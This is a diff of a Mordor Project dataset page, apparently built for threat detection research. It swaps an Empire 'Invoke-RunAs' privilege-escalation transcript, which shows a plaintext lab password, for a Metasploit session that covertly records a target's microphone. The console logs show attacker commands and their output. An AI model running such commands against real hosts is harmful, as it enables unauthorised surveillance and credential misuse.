@@ -5,7 +5,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
   <head>
     <meta charset="utf-8" />
-    <title>Empire Invoke Runas &#8212; Mordor Project</title>
+    <title>MSF Record Microphone &#8212; Mordor Project</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
     <link href="../../../../_static/css/index.css" rel="stylesheet">
     <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css" type="text/css" />
@@ -29,12 +29,12 @@
     <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed.js"></script>
     <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
     <script async="async" src="../../../../_static/thebelab.js"></script>
-    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/04_privilege_escalation/SD-190518204300.html" />
+    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/09_collection/SD-200609225055.html" />
     <link rel="shortcut icon" href="../../../../_static/favicon.ico"/>
     <link rel="index" title="Index" href="../../../../genindex.html" />
     <link rel="search" title="Search" href="../../../../search.html" />
-    <link rel="next" title="Empire DLL Injection" href="SD-190518221344.html" />
-    <link rel="prev" title="Privilege Escalation" href="privilege_escalation.html" />
+    <link rel="next" title="Linux" href="../../linux/linux.html" />
+    <link rel="prev" title="Collection" href="collection.html" />
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="docsearch:language" content="en">
@@ -44,10 +44,10 @@
 
 
 <!-- Opengraph tags -->
-<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/04_privilege_escalation/SD-190518204300.html" />
+<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/09_collection/SD-200609225055.html" />
 <meta property="og:type"        content="article" />
-<meta property="og:title"       content="Empire Invoke Runas" />
-<meta property="og:description" content="Empire Invoke Runas  Metadata          id  SD-190518204300  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2019/05/18  platform  Windows  Mordor Environ" />
+<meta property="og:title"       content="MSF Record Microphone" />
+<meta property="og:description" content="MSF Record Microphone  Metadata          id  SD-200609225055  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2020/06/09  platform  Windows  Mordor Envir" />
 <meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />
 
 <meta name="twitter:card" content="summary">
@@ -117,19 +117,8 @@
     <li class="">
       <a href="../03_persistence/persistence.html">Persistence</a>
     </li>
-    <li class="active">
-      <a href="privilege_escalation.html">Privilege Escalation</a>
-      <ul class="nav sidenav_l3">
-      <li class="active">
-        <a href="">Empire Invoke Runas</a>
-      </li>
-      <li class="">
-        <a href="SD-190518221344.html">Empire DLL Injection</a>
-      </li>
-      <li class="">
-        <a href="SD-190518200432.html">Empire PSInject</a>
-      </li>
-    </ul>
+    <li class="">
+      <a href="../04_privilege_escalation/privilege_escalation.html">Privilege Escalation</a>
     </li>
     <li class="">
       <a href="../05_defense_evasion/defense_evasion.html">Defense Evasion</a>
@@ -143,8 +132,13 @@
     <li class="">
       <a href="../08_lateral_movement/lateral_movement.html">Lateral Movement</a>
     </li>
-    <li class="">
-      <a href="../09_collection/collection.html">Collection</a>
+    <li class="active">
+      <a href="collection.html">Collection</a>
+      <ul class="nav sidenav_l3">
+      <li class="active">
+        <a href="">MSF Record Microphone</a>
+      </li>
+    </ul>
     </li>
   </ul>
   </li>
@@ -184,7 +178,7 @@
                 <!-- ipynb file if we had a myst markdown file -->
                 
                 <!-- Download raw file -->
-                <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/04_privilege_escalation/SD-190518204300.ipynb.txt"><button type="button" class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip" data-placement="left">.ipynb</button></a>
+                <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/09_collection/SD-200609225055.ipynb.txt"><button type="button" class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip" data-placement="left">.ipynb</button></a>
                 <!-- Download PDF via print -->
                 <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF" onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
             </div>
@@ -192,7 +186,7 @@
         </div>
 
         <!-- Edit this page -->
-        <a class="edit-button" href="https://github.com/hunters-forge/mordor/edit/master/docs/notebooks/small/windows/04_privilege_escalation/SD-190518204300.ipynb"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="bottom" title="Edit this page"><i class="fas fa-pencil-alt"></i></button></a>
+        <a class="edit-button" href="https://github.com/hunters-forge/mordor/edit/master/docs/notebooks/small/windows/09_collection/SD-200609225055.ipynb"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="bottom" title="Edit this page"><i class="fas fa-pencil-alt"></i></button></a>
 
         <!-- Full screen (wrap in <a> to have style consistency -->
         <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i class="fas fa-expand"></i></button></a>
@@ -203,7 +197,7 @@
             <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
             <div class="dropdown-buttons">
                 
-                <a class="binder-button" href="https://mybinder.org/v2/gh/hunters-forge/mordor/master?urlpath=tree/docs/notebooks/small/windows/04_privilege_escalation/SD-190518204300.ipynb"><button type="button" class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip" data-placement="left"><img class="binder-button-logo" src="../../../../_static/images/logo_binder.svg" alt="Interact on binder">Binder</button></a>
+                <a class="binder-button" href="https://mybinder.org/v2/gh/hunters-forge/mordor/master?urlpath=tree/docs/notebooks/small/windows/09_collection/SD-200609225055.ipynb"><button type="button" class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip" data-placement="left"><img class="binder-button-logo" src="../../../../_static/images/logo_binder.svg" alt="Interact on binder">Binder</button></a>
                 
                 
                 <button type="button" class="btn btn-secondary topbarbtn thebelab-launch-button" onclick="initThebelab()" title="Launch Thebelab" data-toggle="tooltip" data-placement="left"><i class="fas fa-rocket"></i><span style="margin-left: .4em;">ThebeLab</span></button>
@@ -258,7 +252,7 @@
 
 
 <div class="tocsection editthispage">
-    <a href="https://github.com/hunters-forge/mordor/edit/master/docs/notebooks/small/windows/04_privilege_escalation/SD-190518204300.ipynb">
+    <a href="https://github.com/hunters-forge/mordor/edit/master/docs/notebooks/small/windows/09_collection/SD-200609225055.ipynb">
         <i class="fas fa-pencil-alt"></i> Edit this page
     </a>
 </div>
@@ -270,8 +264,8 @@
         
               <div>
                 
-  <div class="section" id="empire-invoke-runas">
-<h1>Empire Invoke Runas<a class="headerlink" href="#empire-invoke-runas" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="msf-record-microphone">
+<h1>MSF Record Microphone<a class="headerlink" href="#msf-record-microphone" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="metadata">
 <h2>Metadata<a class="headerlink" href="#metadata" title="Permalink to this headline">¶</a></h2>
 <table class="colwidths-auto table">
@@ -282,13 +276,13 @@
 </thead>
 <tbody>
 <tr class="row-even"><td class="text-align:left"><p>id</p></td>
-<td class="text-align:left"><p>SD-190518204300</p></td>
+<td class="text-align:left"><p>SD-200609225055</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>author</p></td>
 <td class="text-align:left"><p>Roberto Rodriguez &#64;Cyb3rWard0g</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>creation date</p></td>
-<td class="text-align:left"><p>2019/05/18</p></td>
+<td class="text-align:left"><p>2020/06/09</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>platform</p></td>
 <td class="text-align:left"><p>Windows</p></td>
@@ -300,57 +294,62 @@
 <td class="text-align:left"><p>C2</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Simulation Tool</p></td>
-<td class="text-align:left"><p>Empire</p></td>
+<td class="text-align:left"><p>Metasploit</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Simulation Script</p></td>
-<td class="text-align:left"><p>https://github.com/hunters-forge/mordor/blob/master/large_datasets/apt3/environment/empire/scripts/invoke-runas-cmd.ps1</p></td>
+<td class="text-align:left"><p>https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/multi/manage/record_mic.rb</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Mordor Dataset</p></td>
-<td class="text-align:left"><p>https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/privilege_escalation/empire_invoke_runas.tar.gz</p></td>
+<td class="text-align:left"><p>https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/collection/msf_record_mic.zip</p></td>
 </tr>
 </tbody>
 </table>
 </div>
 <div class="section" id="dataset-description">
 <h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
-<p>This dataset represents adversaries creating processes with explicit credentials (runas style).</p>
+<p>This dataset represents adversaries accessing the microphone of an endpoint.</p>
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">TKV35P8X</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">scriptimport</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">runas</span><span class="o">-</span><span class="n">cmd</span><span class="o">.</span><span class="n">ps1</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">TKV35P8X</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_SCRIPT_IMPORT</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="n">TKV35P8X</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">22</span>
-<span class="n">script</span> <span class="n">successfully</span> <span class="n">saved</span> <span class="ow">in</span> <span class="n">memory</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">post</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">record_mic</span>
+<span class="n">msf5</span> <span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">record_mic</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">SESSION</span> <span class="mi">2</span>
+<span class="n">SESSION</span> <span class="o">=&gt;</span> <span class="mi">2</span>
+<span class="n">msf5</span> <span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">record_mic</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">info</span>
 
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">TKV35P8X</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">scriptcmd</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">RunAs</span> <span class="o">-</span><span class="n">username</span> <span class="n">pgustavo</span> <span class="o">-</span><span class="n">password</span> <span class="s2">&quot;W1n1!19&quot;</span> <span class="o">-</span><span class="n">domain</span> <span class="n">shire</span> <span class="o">-</span><span class="n">Cmd</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">Arguments</span> <span class="s2">&quot;/c C:\windows\system32</span><span class="se">\a</span><span class="s2">utoupdate.vbs&quot;</span>
+      <span class="n">Name</span><span class="p">:</span> <span class="n">Multi</span> <span class="n">Manage</span> <span class="n">Record</span> <span class="n">Microphone</span>
+    <span class="n">Module</span><span class="p">:</span> <span class="n">post</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">record_mic</span>
+  <span class="n">Platform</span><span class="p">:</span> <span class="n">Linux</span><span class="p">,</span> <span class="n">OSX</span><span class="p">,</span> <span class="n">Windows</span>
+      <span class="n">Arch</span><span class="p">:</span> 
+      <span class="n">Rank</span><span class="p">:</span> <span class="n">Normal</span>
 
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">TKV35P8X</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_SCRIPT_COMMAND</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="n">TKV35P8X</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">23</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">TKV35P8X</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">Job</span> <span class="n">started</span><span class="p">:</span> <span class="n">G16X7P</span>
+<span class="n">Provided</span> <span class="n">by</span><span class="p">:</span>
+  <span class="n">sinn3r</span> <span class="o">&lt;</span><span class="n">sinn3r</span><span class="nd">@metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
 
-<span class="n">Handles</span>  <span class="n">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>    <span class="n">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>      <span class="n">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>     <span class="n">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="n">Id</span>  <span class="n">SI</span> <span class="n">ProcessName</span>                                                   
-<span class="o">-------</span>  <span class="o">------</span>    <span class="o">-----</span>      <span class="o">-----</span>     <span class="o">------</span>     <span class="o">--</span>  <span class="o">--</span> <span class="o">-----------</span>                                                   
-    <span class="mi">18</span>       <span class="mi">4</span>     <span class="mi">1528</span>       <span class="mi">1200</span>       <span class="mf">0.00</span>   <span class="mi">6732</span>   <span class="mi">1</span> <span class="n">cmd</span>                                                           
+<span class="n">Compatible</span> <span class="n">session</span> <span class="n">types</span><span class="p">:</span>
+  <span class="n">Meterpreter</span>
 
+<span class="n">Basic</span> <span class="n">options</span><span class="p">:</span>
+  <span class="n">Name</span>      <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+  <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+  <span class="n">DURATION</span>  <span class="mi">5</span>                <span class="n">no</span>        <span class="n">Number</span> <span class="n">of</span> <span class="n">seconds</span> <span class="n">to</span> <span class="n">record</span>
+  <span class="n">SESSION</span>   <span class="mi">2</span>                <span class="n">yes</span>       <span class="n">The</span> <span class="n">session</span> <span class="n">to</span> <span class="n">run</span> <span class="n">this</span> <span class="n">module</span> <span class="n">on</span><span class="o">.</span>
 
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">POWERSHELL</span> <span class="n">stager</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">1</span><span class="p">)</span> <span class="n">to</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">New</span> <span class="n">agent</span> <span class="n">V6W3TH8Y</span> <span class="n">checked</span> <span class="ow">in</span>
-<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Initial</span> <span class="n">agent</span> <span class="n">V6W3TH8Y</span> <span class="kn">from</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span> <span class="n">now</span> <span class="n">active</span> <span class="p">(</span><span class="n">Slack</span><span class="p">)</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">agent</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">2</span><span class="p">)</span> <span class="n">to</span> <span class="n">V6W3TH8Y</span> <span class="n">at</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span>
+<span class="n">Description</span><span class="p">:</span>
+  <span class="n">This</span> <span class="n">module</span> <span class="n">will</span> <span class="n">enable</span> <span class="ow">and</span> <span class="n">record</span> <span class="n">your</span> <span class="n">target</span><span class="s1">&#39;s microphone. For </span>
+  <span class="n">non</span><span class="o">-</span><span class="n">Windows</span> <span class="n">targets</span><span class="p">,</span> <span class="n">please</span> <span class="n">use</span> <span class="n">Java</span> <span class="n">meterpreter</span> <span class="n">to</span> <span class="n">be</span> <span class="n">able</span> <span class="n">to</span> <span class="n">use</span> 
+  <span class="n">this</span> <span class="n">feature</span><span class="o">.</span>
 
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">TKV35P8X</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">agents</span>
+<span class="n">msf5</span> <span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">record_mic</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
 
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Active</span> <span class="n">agents</span><span class="p">:</span>
-
-<span class="n">Name</span>     <span class="n">La</span> <span class="n">Internal</span> <span class="n">IP</span>     <span class="n">Machine</span> <span class="n">Name</span>      <span class="n">Username</span>                <span class="n">Process</span>            <span class="n">PID</span>    <span class="n">Delay</span>    <span class="n">Last</span> <span class="n">Seen</span>            <span class="n">Listener</span>
-<span class="o">----</span>     <span class="o">--</span> <span class="o">-----------</span>     <span class="o">------------</span>      <span class="o">--------</span>                <span class="o">-------</span>            <span class="o">---</span>    <span class="o">-----</span>    <span class="o">---------</span>            <span class="o">----------------</span>
-<span class="n">H3DKB8SA</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">nmartha</span>           <span class="n">powershell</span>         <span class="mi">5172</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">55</span>  <span class="n">https</span>           
-<span class="n">TKV35P8X</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="o">*</span><span class="n">SHIRE</span>\<span class="n">nmartha</span>          <span class="n">powershell</span>         <span class="mi">5452</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">51</span>  <span class="n">https</span>           
-<span class="n">EMDBFPSY</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">nmartha</span>           <span class="n">notepad</span>            <span class="mi">7924</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">54</span>  <span class="n">https</span>           
-
-<span class="n">V6W3TH8Y</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">pgustavo</span>          <span class="n">powershell</span>         <span class="mi">5204</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">52</span>  <span class="n">https</span>           
-
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span> <span class="o">-</span> <span class="mi">20</span><span class="o">%...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span> <span class="o">-</span> <span class="mi">40</span><span class="o">%...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span> <span class="o">-</span> <span class="mi">60</span><span class="o">%...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span> <span class="o">-</span> <span class="mi">80</span><span class="o">%...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span> <span class="o">-</span> <span class="mi">100</span><span class="o">%...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span> <span class="o">-</span> <span class="n">Audio</span> <span class="n">size</span><span class="p">:</span> <span class="p">(</span><span class="mi">55169</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span> <span class="o">-</span> <span class="n">Audio</span> <span class="n">recording</span> <span class="n">saved</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">msf</span><span class="o">/.</span><span class="n">msf4</span><span class="o">/</span><span class="n">loot</span><span class="o">/</span><span class="mi">20200610025201</span><span class="n">_default_172</span><span class="o">.</span><span class="mf">18.39</span><span class="o">.</span><span class="mf">6_172.18</span><span class="o">.</span><span class="mf">39.6</span><span class="o">.</span><span class="n">audi_358712</span><span class="o">.</span><span class="n">wav</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Post</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
+<span class="n">msf5</span> <span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">record_mic</span><span class="p">)</span> <span class="o">&gt;</span>
 </pre></div>
 </div>
 </div>
@@ -371,7 +370,7 @@
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/privilege_escalation/empire_invoke_runas.tar.gz&quot;</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/collection/msf_record_mic.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
@@ -412,7 +411,7 @@
         },
         kernelOptions: {
             kernelName: "python3",
-            path: "notebooks/small/windows/04_privilege_escalation"
+            path: "notebooks/small/windows/09_collection"
         }
     }
     </script>
@@ -426,8 +425,8 @@
     
     <div class='prev-next-bottom'>
         
-    <a class='left-prev' id="prev-link" href="privilege_escalation.html" title="previous page">Privilege Escalation</a>
-    <a class='right-next' id="next-link" href="SD-190518221344.html" title="next page">Empire DLL Injection</a>
+    <a class='left-prev' id="prev-link" href="collection.html" title="previous page">Collection</a>
+    <a class='right-next' id="next-link" href="../../linux/linux.html" title="next page">Linux</a>
 
     </div>
     <footer class="footer mt-5 mt-md-0">
